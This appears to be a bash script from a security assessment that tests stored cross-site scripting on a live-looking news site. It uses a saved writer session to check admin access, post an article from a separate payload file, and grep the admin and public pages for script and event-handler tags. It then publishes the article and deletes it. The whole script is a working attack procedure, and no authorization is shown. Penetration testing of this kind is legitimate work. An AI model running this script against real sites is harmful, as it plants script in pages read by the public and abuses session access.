#!/usr/bin/env bash
set -e
TARGET="https://www.thedownundernews.online"
JAR=/home/research/Projects/DownUnderNewsz/evidence/phase2/jar_writer.txt
EV=/home/research/Projects/DownUnderNewsz/evidence/phase3

echo "=== 0 Verify auth (GET /admin/profile) ==="
curl -sS -k -b "$JAR" -w "status=%{http_code}\n" -m 10 "$TARGET/admin/profile"
echo

echo "=== 1 CREATE ==="
curl -sS -k -b "$JAR" -o "$EV/xss-create.json" -w "status=%{http_code}\n" -m 15 \
     -X POST -H "Content-Type: application/json" \
     --data @"$EV/xss-payload.json" "$TARGET/api/admin/articles"
cat "$EV/xss-create.json"
echo
ID=$(python3 -c "import json;d=json.load(open('$EV/xss-create.json'));a=d.get('article',d);print(a.get('id',''))")
SLUG=$(python3 -c "import json;d=json.load(open('$EV/xss-create.json'));a=d.get('article',d);print(a.get('slug',''))")
echo "ID=$ID SLUG=$SLUG"

echo "=== 2 ADMIN EDIT VIEW ==="
curl -sS -k -b "$JAR" -o "$EV/xss-edit.html" -w "status=%{http_code} size=%{size_download}\n" -m 10 "$TARGET/admin/articles/${ID}/edit"
grep -nE 'CLAWSEC|<script|<img|<svg|onerror|onload|&lt;script' "$EV/xss-edit.html" | head -n 10 || echo "(no matches)"

echo "=== 3 PUBLISH ==="
curl -sS -k -b "$JAR" -o "$EV/xss-publish.json" -w "status=%{http_code}\n" -m 15 \
     -X PUT -H "Content-Type: application/json" \
     --data @"$EV/publish-payload.json" "$TARGET/api/admin/articles/${ID}"
cat "$EV/xss-publish.json"
echo

echo "=== 4 PUBLIC VIEW ==="
curl -sS -k -o "$EV/xss-public.html" -w "status=%{http_code} size=%{size_download}\n" -m 10 "$TARGET/article/${SLUG}"
grep -nE 'CLAWSEC|<script|<img|<svg|onerror|onload|&lt;script' "$EV/xss-public.html" | head -n 20 || echo "(no matches)"

echo "=== 5 DELETE ==="
curl -sS -k -b "$JAR" -o "$EV/xss-delete.json" -w "status=%{http_code}\n" -m 10 -X DELETE "$TARGET/api/admin/articles/${ID}"
cat "$EV/xss-delete.json"
echo
echo "DONE id=$ID slug=$SLUG"
